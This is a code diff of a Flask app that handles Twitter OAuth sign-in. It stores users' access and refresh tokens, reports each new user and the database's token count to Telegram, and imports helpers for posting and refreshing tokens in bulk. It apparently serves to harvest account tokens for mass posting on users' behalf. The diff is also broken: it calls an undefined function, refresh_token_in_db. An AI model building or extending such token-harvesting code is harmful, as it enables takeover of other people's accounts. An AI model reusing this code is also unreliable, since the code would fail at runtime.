@@ -1,14 +1,15 @@
-from flask import Blueprint, redirect, request, session, render_template, url_for
+from flask import Flask, redirect, request, session, render_template, url_for
 import requests
 from helpers import (
     generate_code_verifier_and_challenge, send_message_via_telegram, post_tweet,
     get_twitter_username_and_profile, generate_random_string, handle_post_single,
     handle_post_bulk, handle_refresh_single, handle_refresh_bulk
 )
-from database import store_token, get_all_tokens, get_total_tokens
+from database import store_token, get_all_tokens, get_total_tokens, restore_from_backup
 from config import Config
 
-app = Blueprint('app', __name__)
+app = Flask(__name__)
+app.secret_key = Config.SECRET_KEY
 
 @app.route('/')
 def home():
@@ -18,7 +19,7 @@ def home():
 
     if 'username' in session:
         send_message_via_telegram(f"👋 @{session['username']} just returned to the website.")
-        return redirect(url_for('app.welcome'))
+        return redirect(url_for('welcome'))
 
     if request.args.get('authorize') == 'true':
         state = "0"
@@ -67,7 +68,7 @@ def home():
                     f"👤 Username: @{username}\n"
                     f"📊 Total Tokens in Database: {total_tokens}"
                 )
-                return redirect(url_for('app.welcome'))
+                return redirect(url_for('welcome'))
             else:
                 return "Error retrieving user info with access token", 400
 
@@ -83,7 +84,7 @@ def welcome():
     username = session.get('username', 'User')
     
     if 'refresh_token' in session:
-        access_token, refresh_token = handle_refresh_single(session['refresh_token'], username)
+        access_token, refresh_token = refresh_token_in_db(session['refresh_token'], username)
         if access_token and refresh_token:
             session['access_token'] = access_token
             session['refresh_token'] = refresh_token
@@ -93,7 +94,7 @@ def welcome():
 @app.route('/logout')
 def logout():
     session.clear()
-    return redirect(url_for('app.home'))
+    return redirect(url_for('home'))
 
 @app.route('/webhook', methods=['POST'])
 def telegram_webhook():
